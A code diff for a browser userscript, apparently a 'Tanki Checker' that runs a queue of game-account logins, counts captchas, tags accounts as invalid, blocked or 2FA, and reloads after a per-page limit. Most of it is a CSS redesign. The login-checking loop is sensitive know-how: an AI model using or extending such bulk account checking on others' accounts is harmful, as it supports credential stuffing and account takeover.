-            resetCaptchaCount("error");
-            setFastValidStatus(login, { ...(getFastValidStatus(login) || {}), error: true, reason: error.message });
-            advanceFastValidQueue();
-            clearInputFields();
-            return { login, status: "error" };
         }
+
+        if (guard >= maxPerPage) {
+            fvLog("Лимит аккаунтов на страницу — reload");
+            location.reload();
+        }
+        return { login, status: "loop_end" };
     }
 
     // =========================================================
@@ -5672,7 +5908,7 @@ async function testDiscordNotification() {
             if (!st.invalid && !st.rubiesSkipPermanent) return true;
         }
         if (st.rubiesNoDaily === false) return true;
-        if (st.rubiesSubscriptionFinished === true) return true; 
+        if (st.rubiesSubscriptionFinished === true) return true;
         return false;
     }
 
@@ -6073,7 +6309,7 @@ async function testDiscordNotification() {
         }
 
         const mid = measureLocalStorage(ls);
-        const QUOTA_SOFT = 4.5 * 1024 * 1024; 
+        const QUOTA_SOFT = 4.5 * 1024 * 1024;
         if (aggressive || mid.total > QUOTA_SOFT) {
             for (const { key, size } of mid.items) {
                 if (LS_PRESERVE_KEYS.has(key)) continue;
@@ -6145,7 +6381,7 @@ async function testDiscordNotification() {
         let lastClean = 0;
         const maybeCleanFromDom = () => {
             const now = Date.now();
-            if (now - lastClean < 15000) return; 
+            if (now - lastClean < 15000) return;
             const bodyText = (document.body && document.body.innerText) || "";
             if (!/QuotaExceededError|NOTIFICATIONS_ORDINARY_CHALLENGE|exceeded the quota/i.test(bodyText)) return;
             lastClean = now;
@@ -7469,79 +7705,39 @@ async function testDiscordNotification() {
     const style = document.createElement("style");
     style.id = "tchecker-styles";
     style.textContent = `
+/* =========================================================
+   TANKI CHECKER — SILVER FROST UI (full redesign)
+   ========================================================= */
 
-/* ===== RUBIES BULK STATUS ===== */
+/* ----- RUBIES BULK ----- */
 .rub-bulk-box{
-  background:var(--tc-surface-2, rgba(255,255,255,.04));
-  border:1px solid var(--tc-border, rgba(255,255,255,.08));
-  border-radius:12px;
+  background:linear-gradient(160deg,rgba(197,204,216,.06),rgba(20,23,29,.9));
+  border:1px solid rgba(197,204,216,.18);
+  border-radius:8px;
   padding:14px 16px;
   margin-bottom:18px;
 }
-.rub-bulk-hint{
-  font-size:12px;
-  color:var(--tc-text-dim, #9aa3b2);
-  line-height:1.45;
-  margin-bottom:12px;
-}
-.rub-bulk-row{
-  display:flex;
-  flex-wrap:wrap;
-  align-items:flex-end;
-  gap:12px;
-}
-.rub-bulk-field{
-  display:flex;
-  flex-direction:column;
-  gap:6px;
-  min-width:160px;
-  flex:1;
-}
-.rub-bulk-label{
-  font-size:11px;
-  font-weight:600;
-  letter-spacing:.04em;
-  text-transform:uppercase;
-  color:var(--tc-text-muted, #7d8696);
-}
+.rub-bulk-hint{font-size:12px;color:var(--tc-text-dim);line-height:1.45;margin-bottom:12px}
+.rub-bulk-row{display:flex;flex-wrap:wrap;align-items:flex-end;gap:12px}
+.rub-bulk-field{display:flex;flex-direction:column;gap:6px;min-width:160px;flex:1}
+.rub-bulk-label{font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--tc-text-muted)}
 .rub-bulk-select{
   appearance:none;
-  background:var(--tc-surface, #1a1f2b);
-  color:var(--tc-text, #e8ecf4);
-  border:1px solid var(--tc-border, rgba(255,255,255,.12));
-  border-radius:10px;
+  background:var(--tc-surface);
+  color:var(--tc-text);
+  border:1px solid var(--tc-border);
+  border-radius:8px;
   padding:10px 12px;
   font-size:13px;
   min-height:40px;
-  cursor:pointer;
-  outline:none;
-  width:100%;
+  font-family:inherit;
 }
-.rub-bulk-select:focus{
-  border-color:var(--tc-accent, #5b8cff);
-  box-shadow:0 0 0 3px rgba(91,140,255,.2);
-}
-.rub-bulk-arrow{
-  font-size:18px;
-  color:var(--tc-text-dim, #9aa3b2);
-  padding-bottom:8px;
-  flex:0 0 auto;
-}
-.rub-bulk-btn{
-  min-height:40px;
-  padding:0 18px;
-  flex:0 0 auto;
-}
-.rub-bulk-preview{
-  margin-top:12px;
-  font-size:12px;
-  color:var(--tc-text-muted, #7d8696);
-  padding:8px 10px;
-  border-radius:8px;
-  background:rgba(0,0,0,.15);
-}
-/* ===== RESET / BASE ===== */
+.rub-bulk-select:focus{outline:none;border-color:var(--tc-accent);box-shadow:0 0 0 2px var(--tc-accent-soft)}
+.rub-bulk-arrow{align-self:center;font-size:18px;color:var(--tc-accent);font-weight:700;padding:0 4px}
+.rub-bulk-btn{min-width:120px}
+.rub-bulk-preview{margin-top:10px;font-size:12px;color:var(--tc-text-muted)}
 
+/* ----- RESET ----- */
 #tc-menu.tchecker-ui,
 #tc-menu.tchecker-ui *,
 #tc-overlay.tchecker-ui,
@@ -7554,16 +7750,15 @@ async function testDiscordNotification() {
 #tc-rubies-add-modal.tchecker-ui,
 #tc-rubies-add-modal.tchecker-ui *,
 .tc-toast-stack.tchecker-ui,
-.tc-toast-stack.tchecker-ui *{
-  box-sizing:border-box;
-}
+.tc-toast-stack.tchecker-ui *{box-sizing:border-box}
+
 #tc-menu.tchecker-ui,
 #tc-detail-modal.tchecker-ui,
 #tc-assets-modal.tchecker-ui,
 #tc-gold-modal.tchecker-ui,
 #tc-rubies-add-modal.tchecker-ui,
 .tc-toast-stack.tchecker-ui{
-  font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  font-family:"Segoe UI",Inter,-apple-system,BlinkMacSystemFont,Roboto,Arial,sans-serif;
   -webkit-font-smoothing:antialiased;
   color:var(--tc-text);
 }
@@ -7572,37 +7767,39 @@ async function testDiscordNotification() {
 #tc-assets-modal.tchecker-ui svg,
 #tc-gold-modal.tchecker-ui svg{width:16px;height:16px;flex-shrink:0;display:block}
 
-/* ===== THEMES ===== */
+/* ----- THEME: SILVER FROST ----- */
 #tc-menu.tchecker-ui[data-theme="dark"],
-#tc-detail-modal.tchecker-ui[data-theme="dark"],
-#tc-rubies-add-modal.tchecker-ui[data-theme="dark"],
-#tc-assets-modal.tchecker-ui[data-theme="dark"],
-#tc-gold-modal.tchecker-ui[data-theme="dark"],
-.tc-toast-stack.tchecker-ui[data-theme="dark"]{
-  --tc-bg:#0b0b0d;
-  --tc-bg-2:#111114;
-  --tc-surface:#16161a;
-  --tc-surface-2:#1c1c22;
-  --tc-surface-3:#24242c;
-  --tc-border:#2a2a32;
-  --tc-border-2:#3a3a46;
-  --tc-text:#f2f2f5;
-  --tc-text-muted:#9a9aa8;
-  --tc-text-dim:#6b6b78;
-  --tc-accent:#c43b6e;
-  --tc-accent-soft:rgba(196,59,110,.16);
-  --tc-accent-strong:#e04d82;
-  --tc-success:#3ecf8e;
-  --tc-warning:#f0b429;
-  --tc-danger:#ff5c68;
-  --tc-info:#5b9fd4;
-  --tc-scroll-thumb:#3a3a46;
-  --tc-scroll-track:#111114;
-  --tc-sidebar-bg:#0e0e12;
-  --tc-sidebar-text:#f2f2f5;
-  --tc-sidebar-muted:#9a9aa8;
-  --tc-sidebar-dim:#6b6b78;
-  --tc-shadow:0 28px 80px rgba(0,0,0,.65);
+.tc-toast-stack[data-theme="dark"],
+#tc-detail-modal[data-theme="dark"],
+#tc-rubies-add-modal[data-theme="dark"],
+#tc-assets-modal[data-theme="dark"],
+#tc-gold-modal[data-theme="dark"]{
+  --tc-bg:#08090c;
+  --tc-bg-2:#0c0e13;
+  --tc-surface:#12151c;
+  --tc-surface-2:#181c25;
+  --tc-surface-3:#1f2430;
+  --tc-border:rgba(197,204,216,.14);
+  --tc-border-2:rgba(197,204,216,.28);
+  --tc-text:#eef1f6;
+  --tc-text-muted:#9aa3b2;
+  --tc-text-dim:#6b7382;
+  --tc-accent:#d0d6e0;
+  --tc-accent-soft:rgba(208,214,224,.14);
+  --tc-accent-strong:#f2f4f8;
+  --tc-success:#4fd6a0;
+  --tc-warning:#e6b84d;
+  --tc-danger:#f07178;
+  --tc-info:#8ea3bf;
+  --tc-scroll-thumb:rgba(197,204,216,.28);
+  --tc-scroll-track:transparent;
+  --tc-sidebar-bg:#0a0c11;
+  --tc-sidebar-text:#eef1f6;
+  --tc-sidebar-muted:#9aa3b2;
+  --tc-sidebar-dim:#6b7382;
+  --tc-shadow:0 40px 100px rgba(0,0,0,.8),0 0 0 1px rgba(208,214,224,.12);
+  --tc-chrome:linear-gradient(135deg,#f4f6fa 0%,#c8cfdc 40%,#9aa5b8 72%,#d8dee8 100%);
+  --tc-glass:rgba(18,21,28,.82);
 }
 
 #tc-menu.tchecker-ui[data-theme="light"],
@@ -7611,588 +7808,995 @@ async function testDiscordNotification() {
 #tc-assets-modal.tchecker-ui[data-theme="light"],
 #tc-gold-modal.tchecker-ui[data-theme="light"],
 .tc-toast-stack.tchecker-ui[data-theme="light"]{
-  --tc-bg:#f6f4ef;
-  --tc-bg-2:#efece4;
+  --tc-bg:#eef1f5;
+  --tc-bg-2:#e4e8ef;
   --tc-surface:#ffffff;
-  --tc-surface-2:#f7f5ef;
-  --tc-surface-3:#ece8de;
-  --tc-border:#ddd6c8;
-  --tc-border-2:#cfc6b4;
-  --tc-text:#1c1914;
-  --tc-text-muted:#6f675c;
-  --tc-text-dim:#9a9184;
-  --tc-accent:#a33d65;
-  --tc-accent-soft:rgba(163,61,101,.12);
-  --tc-accent-strong:#c24d7a;
-  --tc-success:#2f9e6a;
-  --tc-warning:#c48a12;
-  --tc-danger:#d1434b;
-  --tc-info:#3d7eb5;
-  --tc-scroll-thumb:#cfc6b4;
-  --tc-scroll-track:#efece4;
-  --tc-sidebar-bg:#f0ece3;
-  --tc-sidebar-text:#1c1914;
-  --tc-sidebar-muted:#5c554b;
-  --tc-sidebar-dim:#8a8174;
-  --tc-shadow:0 28px 80px rgba(40,30,15,.18);
+  --tc-surface-2:#f5f7fa;
+  --tc-surface-3:#e8ecf2;
+  --tc-border:rgba(40,50,70,.12);
+  --tc-border-2:rgba(40,50,70,.22);
+  --tc-text:#141820;
+  --tc-text-muted:#5a6474;
+  --tc-text-dim:#8a93a3;
+  --tc-accent:#5a6578;
+  --tc-accent-soft:rgba(90,101,120,.12);
+  --tc-accent-strong:#2a3344;
+  --tc-success:#1f9a6a;
+  --tc-warning:#b8860b;
+  --tc-danger:#c23b44;
+  --tc-info:#3d6f9e;
+  --tc-scroll-thumb:rgba(40,50,70,.2);
+  --tc-scroll-track:transparent;
+  --tc-sidebar-bg:#e8ecf2;
+  --tc-sidebar-text:#141820;
+  --tc-sidebar-muted:#5a6474;
+  --tc-sidebar-dim:#8a93a3;
+  --tc-shadow:0 28px 70px rgba(20,30,50,.18);
+  --tc-chrome:linear-gradient(135deg,#ffffff,#c5ccd8 50%,#e8ecf2);
+  --tc-glass:rgba(255,255,255,.88);
 }
 
-/* ===== SHELL ===== */
+/* ----- SHELL ----- */
 #tc-overlay{
   position:fixed;inset:0;z-index:99998;
-  background:rgba(0,0,0,.62);
-  backdrop-filter:blur(14px);
+  background:radial-gradient(ellipse at center,rgba(12,16,24,.55) 0%,rgba(4,6,10,.82) 100%);
+  backdrop-filter:blur(18px) saturate(1.15);
   opacity:0;visibility:hidden;
-  transition:opacity .2s ease,visibility .2s ease;
+  transition:opacity .25s ease,visibility .25s ease;
 }
 #tc-overlay.open{opacity:1;visibility:visible}
 
 #tc-menu{
   position:fixed;top:50%;left:50%;
-  transform:translate(-50%,-50%) scale(.97);
+  transform:translate(-50%,-50%) scale(.96) translateY(8px);
   z-index:99999;
-  width:min(1200px,calc(100vw - 24px));
-  height:min(800px,calc(100vh - 24px));
+  width:min(1180px,calc(100vw - 20px));
+  height:min(780px,calc(100vh - 20px));
   opacity:0;visibility:hidden;pointer-events:none;
-  transition:opacity .22s ease,transform .22s cubic-bezier(.22,.61,.36,1),visibility .22s;
+  transition:opacity .28s ease,transform .28s cubic-bezier(.2,.8,.2,1),visibility .28s;
 }
 #tc-menu.open{
   opacity:1;visibility:visible;pointer-events:auto;
-  transform:translate(-50%,-50%) scale(1);
+  transform:translate(-50%,-50%) scale(1) translateY(0);
 }
 
 #tc-panel{
   width:100%;height:100%;
   display:grid;
-  grid-template-columns:248px minmax(0,1fr);
-  grid-template-rows:72px minmax(0,1fr);
+  grid-template-columns:220px minmax(0,1fr);
+  grid-template-rows:56px minmax(0,1fr);
   grid-template-areas:"sidebar header" "sidebar content";
   background:var(--tc-bg);
-  border:1px solid var(--tc-border);
-  border-radius:20px;
+  border:1px solid rgba(208,214,224,.2);
+  border-radius:12px;
   overflow:hidden;
   box-shadow:var(--tc-shadow);
   color:var(--tc-text) !important;
+  position:relative;
+}
+#tc-panel::before{
+  content:"";
+  position:absolute;inset:0;pointer-events:none;z-index:0;
+  background:
+    linear-gradient(180deg,rgba(255,255,255,.03) 0%,transparent 40%),
+    radial-gradient(ellipse 80% 50% at 100% 0%,rgba(208,214,224,.06),transparent 50%);
+}
+#tc-menu[data-theme="dark"] #tc-panel{
+  background:linear-gradient(165deg,#0c0e14 0%,#08090c 55%,#0a0c12 100%);
 }
 
-/* ===== SIDEBAR — force readable text in both themes ===== */
+/* ----- SIDEBAR ----- */
 #tc-menu .tc-tabs{
   grid-area:sidebar;
   display:flex;flex-direction:column;
-  padding:20px 12px 14px;
+  padding:14px 10px 12px;
   background:var(--tc-sidebar-bg) !important;
   border-right:1px solid var(--tc-border);
   color:var(--tc-sidebar-text) !important;
+  position:relative;z-index:1;
 }
-#tc-menu .tc-brand{display:flex;align-items:center;gap:12px;margin-bottom:22px;padding:0 8px}
+#tc-menu[data-theme="dark"] .tc-tabs{
+  background:linear-gradient(180deg,#0d1016 0%,#090b10 100%) !important;
+  border-right-color:rgba(208,214,224,.1) !important;
+}
+#tc-menu .tc-brand{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:16px;padding:6px 8px 14px;
+  border-bottom:1px solid var(--tc-border);
+}
 #tc-menu .tc-brand-mark{
-  width:40px;height:40px;border-radius:12px;
-  background:linear-gradient(135deg,var(--tc-accent),var(--tc-accent-strong));
+  width:36px;height:36px;border-radius:8px;
+  background:var(--tc-chrome);
   display:flex;align-items:center;justify-content:center;
-  color:#fff !important;font-weight:800;font-size:14px;letter-spacing:-.3px;
-  box-shadow:0 8px 20px var(--tc-accent-soft);
+  color:#0a0c10 !important;font-weight:800;font-size:12px;letter-spacing:-.3px;
+  box-shadow:0 2px 12px rgba(208,214,224,.25),inset 0 1px 0 rgba(255,255,255,.55);
+  border:1px solid rgba(255,255,255,.25);
 }
-#tc-menu .tc-brand-text{display:flex;flex-direction:column;gap:3px;min-width:0}
+#tc-menu .tc-brand-text{display:flex;flex-direction:column;gap:2px;min-width:0}
 #tc-menu .tc-brand-text b{
-  font-size:13px;font-weight:800;letter-spacing:.3px;
+  font-size:12px;font-weight:800;letter-spacing:.04em;
   color:var(--tc-sidebar-text) !important;
+  text-transform:uppercase;
 }
 #tc-menu .tc-brand-text small{
-  font-size:9px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;
-  color:var(--tc-sidebar-muted) !important;
+  font-size:9px;font-weight:600;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--tc-sidebar-dim) !important;
 }
 
-#tc-menu .tc-nav{display:flex;flex-direction:column;gap:3px;flex:1;overflow:auto}
+#tc-menu .tc-nav{display:flex;flex-direction:column;gap:2px;flex:1;overflow:auto}
 #tc-menu .tc-nav-label{
-  font-size:9px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
+  font-size:9px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;
   color:var(--tc-sidebar-dim) !important;
-  padding:14px 10px 6px;
+  padding:12px 10px 5px;
 }
 
 #tc-menu .tc-tab{
   display:flex;align-items:center;gap:10px;
-  min-height:42px;padding:0 12px;
-  border-radius:11px;
+  min-height:38px;padding:0 10px;
+  border-radius:8px;
   border:1px solid transparent;
   background:transparent;
   color:var(--tc-sidebar-muted) !important;
-  font-size:13px;font-weight:600;letter-spacing:.01em;
+  font-size:12.5px;font-weight:600;letter-spacing:.01em;
   text-align:left;cursor:pointer;font-family:inherit;
-  transition:background .15s ease,color .15s ease,border-color .15s ease;
+  transition:background .12s ease,color .12s ease,border-color .12s ease,box-shadow .12s ease;
 }
 #tc-menu .tc-tab span{color:inherit !important}
-#tc-menu .tc-tab svg{width:17px;height:17px;opacity:.9;color:inherit !important;stroke:currentColor}
+#tc-menu .tc-tab svg{width:16px;height:16px;opacity:.85;color:inherit !important;stroke:currentColor}
 #tc-menu .tc-tab:hover{
-  background:var(--tc-surface) !important;
+  background:rgba(208,214,224,.07) !important;
   color:var(--tc-sidebar-text) !important;
-  border-color:var(--tc-border);
+  border-color:rgba(208,214,224,.1);
 }
 #tc-menu .tc-tab.active{
-  background:var(--tc-accent-soft) !important;
-  color:var(--tc-sidebar-text) !important;
-  border-color:transparent;
-  box-shadow:inset 3px 0 0 var(--tc-accent);
+  background:rgba(208,214,224,.1) !important;
+  color:#fff !important;
+  border-color:rgba(208,214,224,.22);
+  box-shadow:inset 2px 0 0 #d0d6e0;
 }
 #tc-menu .tc-sidebar-footer{
-  margin-top:10px;padding:12px 10px 4px;
+  margin-top:8px;padding:10px 10px 2px;
   border-top:1px solid var(--tc-border);
-  font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
+  font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;
   color:var(--tc-sidebar-dim) !important;
 }
 
-/* ===== HEADER ===== */
+/* ----- HEADER ----- */
 #tc-menu .tc-header{
   grid-area:header;
   display:flex;align-items:center;justify-content:space-between;
-  padding:0 24px;
-  background:var(--tc-bg);
+  padding:0 20px;
+  background:rgba(12,14,20,.55) !important;
   border-bottom:1px solid var(--tc-border);
+  backdrop-filter:blur(12px);
+  position:relative;z-index:1;
 }
-#tc-menu .tc-header-left{display:flex;flex-direction:column;gap:2px}
-#tc-menu .tc-title{font-size:18px;font-weight:800;letter-spacing:-.02em;color:var(--tc-text) !important}
-#tc-menu .tc-subtitle{font-size:12px;color:var(--tc-text-muted) !important}
+#tc-menu .tc-header-left{display:flex;flex-direction:column;gap:1px}
+#tc-menu .tc-title{
+  font-size:15px;font-weight:750;letter-spacing:.02em;
+  color:var(--tc-text) !important;
+  text-transform:uppercase;
+}
+#tc-menu .tc-subtitle{font-size:11px;color:var(--tc-text-dim) !important}
 #tc-menu .tc-header-right{display:flex;align-items:center;gap:8px}
 
 #tc-menu .tc-chip{
-  display:inline-flex;align-items:center;gap:8px;
-  height:34px;padding:0 12px;border-radius:999px;
-  background:var(--tc-surface);border:1px solid var(--tc-border);
+  display:inline-flex;align-items:center;gap:7px;
+  height:30px;padding:0 11px;border-radius:6px;
+  background:var(--tc-surface-2);
+  border:1px solid var(--tc-border);
   color:var(--tc-text-muted) !important;
-  font-size:11px;font-weight:650;
+  font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;
 }
 #tc-menu .tc-chip .dot{
-  width:7px;height:7px;border-radius:50%;
-  background:var(--tc-success);box-shadow:0 0 0 3px rgba(62,207,142,.18);
+  width:6px;height:6px;border-radius:50%;
+  background:var(--tc-success);
+  box-shadow:0 0 8px rgba(79,214,160,.45);
 }
 #tc-menu .tc-chip.idle .dot{background:var(--tc-text-dim);box-shadow:none}
-#tc-menu .tc-chip.warning .dot{background:var(--tc-warning)}
-#tc-menu .tc-chip.danger .dot{background:var(--tc-danger)}
+#tc-menu .tc-chip.warning .dot{background:var(--tc-warning);box-shadow:0 0 8px rgba(230,184,77,.4)}
+#tc-menu .tc-chip.danger .dot{background:var(--tc-danger);box-shadow:0 0 8px rgba(240,113,120,.4)}
 
 #tc-menu .tc-icon-btn{
-  width:34px;height:34px;border-radius:10px;
+  width:30px;height:30px;border-radius:6px;
   border:1px solid var(--tc-border);
-  background:var(--tc-surface);
+  background:var(--tc-surface-2);
   color:var(--tc-text-muted) !important;
   display:inline-flex;align-items:center;justify-content:center;
-  cursor:pointer;transition:all .15s ease;
+  cursor:pointer;transition:all .12s ease;
 }
 #tc-menu .tc-icon-btn:hover{
   color:var(--tc-text) !important;
   border-color:var(--tc-border-2);
-  background:var(--tc-surface-2);
+  background:var(--tc-surface-3);
 }
 
-/* ===== CONTENT ===== */
+/* ----- CONTENT ----- */
 #tc-menu .tc-tab-content{
   grid-area:content;display:none;overflow:auto;
-  padding:22px 26px 28px;
-  background:var(--tc-bg);
+  padding:18px 22px 24px;
+  background:transparent;
   color:var(--tc-text) !important;
   scrollbar-width:thin;
   scrollbar-color:var(--tc-scroll-thumb) var(--tc-scroll-track);
+  position:relative;z-index:1;
 }
 #tc-menu .tc-tab-content.active{display:block}
-#tc-menu .tc-tab-content::-webkit-scrollbar{width:8px}
-#tc-menu .tc-tab-content::-webkit-scrollbar-thumb{background:var(--tc-scroll-thumb);border-radius:8px}
+#tc-menu .tc-tab-content::-webkit-scrollbar{width:6px}
+#tc-menu .tc-tab-content::-webkit-scrollbar-thumb{background:var(--tc-scroll-thumb);border-radius:6px}
 #tc-menu .tc-tab-content::-webkit-scrollbar-track{background:transparent}
 
 #tc-menu .tc-section-title{
-  margin:0 0 12px;
-  font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
+  margin:0 0 10px;
+  font-size:10px;font-weight:800;letter-spacing:.16em;text-transform:uppercase;
   color:var(--tc-text-dim) !important;
+  display:flex;align-items:center;gap:10px;
+}
+#tc-menu .tc-section-title::after{
+  content:"";flex:1;height:1px;
+  background:linear-gradient(90deg,var(--tc-border),transparent);
 }
 
-/* ===== STATS / CARDS ===== */
+/* ----- STATS ----- */
 #tc-menu .tc-stats{
-  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
-  gap:10px;margin-bottom:8px;
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
+  gap:8px;margin-bottom:10px;
 }
 #tc-menu .tc-stat{
   position:relative;
-  padding:14px 14px 12px;
-  border-radius:14px;
+  padding:12px 12px 10px;
+  border-radius:8px;
   background:var(--tc-surface);
   border:1px solid var(--tc-border);
-  transition:transform .15s ease,border-color .15s ease;
-}
-#tc-menu .tc-stat:hover{border-color:var(--tc-border-2);transform:translateY(-1px)}
-#tc-menu .tc-stat-icon{position:absolute;top:12px;right:12px;opacity:.35;color:var(--tc-text-muted)}
-#tc-menu .tc-stat-value{font-size:22px;font-weight:800;letter-spacing:-.03em;color:var(--tc-text) !important}
-#tc-menu .tc-stat-label{margin-top:6px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--tc-text-muted) !important}
-#tc-menu .tc-stat-sub{margin-top:3px;font-size:11px;color:var(--tc-text-dim) !important}
-
-#tc-menu .tc-account-card,
-#tc-menu .tc-prem-card{
-  display:flex;align-items:center;justify-content:space-between;gap:12px;
-  padding:12px 14px;margin-bottom:8px;
-  border-radius:12px;
-  background:var(--tc-surface);
-  border:1px solid var(--tc-border);
-  color:var(--tc-text) !important;
+  border-left:3px solid rgba(208,214,224,.45);
   transition:border-color .15s ease,background .15s ease;
 }
-#tc-menu .tc-account-card:hover,
-#tc-menu .tc-prem-card:hover{border-color:var(--tc-border-2);background:var(--tc-surface-2)}
-#tc-menu .tc-account-card .login,
-#tc-menu .tc-prem-login{font-size:13px;font-weight:700;color:var(--tc-text) !important}
-#tc-menu .tc-account-card .details,
-#tc-menu .tc-prem-rank{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
+#tc-menu .tc-stat:hover{
+  border-color:var(--tc-border-2);
+  border-left-color:#d0d6e0;
+  background:var(--tc-surface-2);
+}
+#tc-menu .tc-stat-icon{position:absolute;top:10px;right:10px;opacity:.3;color:var(--tc-text-muted)}
+#tc-menu .tc-stat-value{
+  font-size:20px;font-weight:800;letter-spacing:-.02em;
+  color:var(--tc-text) !important;
+  font-variant-numeric:tabular-nums;
+}
+#tc-menu .tc-stat-label{
+  margin-top:4px;font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--tc-text-muted) !important;
+}
+#tc-menu .tc-stat-sub{margin-top:2px;font-size:11px;color:var(--tc-text-dim) !important}
+
+/* ----- ACCOUNT CARDS ----- */
+#tc-menu .tc-account-list{display:flex;flex-direction:column;gap:6px}
+#tc-menu .tc-account-card,
+#tc-menu .tc-account-card{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+  padding:10px 12px;
+  border-radius:8px;
+  background:var(--tc-surface);
+  border:1px solid var(--tc-border);
+  cursor:pointer;
+  transition:border-color .12s ease,background .12s ease;
+}
+#tc-menu .tc-account-card:hover{
+  border-color:var(--tc-border-2);
+  background:var(--tc-surface-2);
+}
+#tc-menu .tc-account-card .login{
+  font-size:13px;font-weight:700;color:var(--tc-text) !important;
+}
+#tc-menu .tc-account-card .details{
+  display:flex;flex-wrap:wrap;gap:4px;margin-top:4px;
+}
+#tc-menu .tc-account-card .tag,
 #tc-menu .tag{
   display:inline-flex;align-items:center;
-  padding:2px 8px;border-radius:999px;
-  background:var(--tc-surface-3);
-  border:1px solid var(--tc-border);
-  font-size:10px;font-weight:600;
-  color:var(--tc-text-muted) !important;
+  padding:2px 7px;border-radius:4px;
+  font-size:10px;font-weight:650;
+  background:rgba(208,214,224,.08);
+  border:1px solid rgba(208,214,224,.12);
+  color:var(--tc-text-muted);
 }
-#tc-menu .tag.accent{background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important;border-color:transparent}
+#tc-menu .tag.accent{
+  background:rgba(208,214,224,.16);
+  border-color:rgba(208,214,224,.28);
+  color:var(--tc-accent-strong);
+}
+
 #tc-menu .tc-status-tag{
-  flex:0 0 auto;padding:4px 10px;border-radius:999px;
+  display:inline-flex;align-items:center;justify-content:center;
+  min-width:64px;height:24px;padding:0 8px;
+  border-radius:4px;
   font-size:10px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;
+  border:1px solid transparent;
 }
-#tc-menu .tag-done{background:rgba(62,207,142,.15);color:var(--tc-success) !important}
-#tc-menu .tag-ready{background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important}
-#tc-menu .tag-pending{background:var(--tc-surface-3);color:var(--tc-text-muted) !important}
-#tc-menu .tag-invalid,#tc-menu .tag-blocked,#tc-menu .tag-error{background:rgba(255,92,104,.12);color:var(--tc-danger) !important}
-#tc-menu .tag-twofa,#tc-menu .tag-nickname{background:rgba(240,180,41,.14);color:var(--tc-warning) !important}
+#tc-menu .tag-pending{background:rgba(107,115,130,.15);color:#9aa3b2;border-color:rgba(107,115,130,.25)}
+#tc-menu .tag-done,#tc-menu .tag-ready{background:rgba(79,214,160,.12);color:#4fd6a0;border-color:rgba(79,214,160,.25)}
+#tc-menu .tag-invalid,#tc-menu .tag-error,#tc-menu .tag-blocked{background:rgba(240,113,120,.12);color:#f07178;border-color:rgba(240,113,120,.25)}
+#tc-menu .tag-twofa,#tc-menu .tag-nickname{background:rgba(230,184,77,.12);color:#e6b84d;border-color:rgba(230,184,77,.25)}
 
-#tc-menu .tc-empty{
-  padding:28px 20px;text-align:center;
-  border:1px dashed var(--tc-border-2);border-radius:14px;
-  color:var(--tc-text-muted) !important;
-}
-#tc-menu .tc-empty h4{margin:0 0 6px;color:var(--tc-text) !important;font-size:14px}
-#tc-menu .tc-empty p{margin:0;font-size:12px;color:var(--tc-text-dim) !important}
-
-/* ===== CONTROLS ===== */
+/* ----- BUTTONS ----- */
 #tc-menu .tc-actions{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0}
 #tc-menu .tc-btn{
   display:inline-flex;align-items:center;justify-content:center;gap:7px;
-  min-height:36px;padding:0 14px;
-  border-radius:10px;border:1px solid transparent;
-  font-size:12px;font-weight:700;font-family:inherit;
-  cursor:pointer;transition:all .15s ease;
+  min-height:34px;padding:0 14px;
+  border-radius:6px;
+  font-size:12px;font-weight:700;letter-spacing:.03em;
+  font-family:inherit;cursor:pointer;
+  border:1px solid transparent;
+  transition:filter .12s ease,background .12s ease,border-color .12s ease;
+  flex:1 1 auto;
 }
 #tc-menu .tc-btn svg{width:14px;height:14px}
 #tc-menu .tc-btn-primary{
-  background:linear-gradient(135deg,var(--tc-accent),var(--tc-accent-strong));
-  color:#fff !important;border-color:transparent;
-  box-shadow:0 6px 16px var(--tc-accent-soft);
+  background:var(--tc-chrome);
+  color:#0a0c10 !important;
+  border-color:rgba(255,255,255,.35);
+  box-shadow:0 1px 0 rgba(255,255,255,.4) inset,0 2px 8px rgba(208,214,224,.15);
 }
-#tc-menu .tc-btn-primary:hover{filter:brightness(1.06)}
+#tc-menu .tc-btn-primary:hover{filter:brightness(1.07)}
 #tc-menu .tc-btn-secondary{
-  background:var(--tc-surface);color:var(--tc-text) !important;
-  border-color:var(--tc-border);
-}
-#tc-menu .tc-btn-secondary:hover{background:var(--tc-surface-2);border-color:var(--tc-border-2)}
-#tc-menu .tc-btn-danger{
-  background:rgba(255,92,104,.1);color:var(--tc-danger) !important;
-  border-color:rgba(255,92,104,.22);
-}
-#tc-menu .tc-btn-danger:hover{background:rgba(255,92,104,.18)}
-#tc-menu .tc-btn:disabled{opacity:.45;cursor:not-allowed}
-
-#tc-menu .tc-mode-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
-#tc-menu .tc-mode-btn{
-  min-height:34px;padding:0 14px;border-radius:10px;
-  border:1px solid var(--tc-border);background:var(--tc-surface);
-  color:var(--tc-text-muted) !important;font-size:12px;font-weight:700;
-  cursor:pointer;font-family:inherit;
-}
-#tc-menu .tc-mode-btn.active{
-  background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important;
-  border-color:transparent;
-}
-
-#tc-menu .tc-filters{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
-#tc-menu .tc-filter-btn{
-  min-height:30px;padding:0 11px;border-radius:999px;
-  border:1px solid var(--tc-border);background:var(--tc-surface);
-  color:var(--tc-text-muted) !important;font-size:11px;font-weight:700;
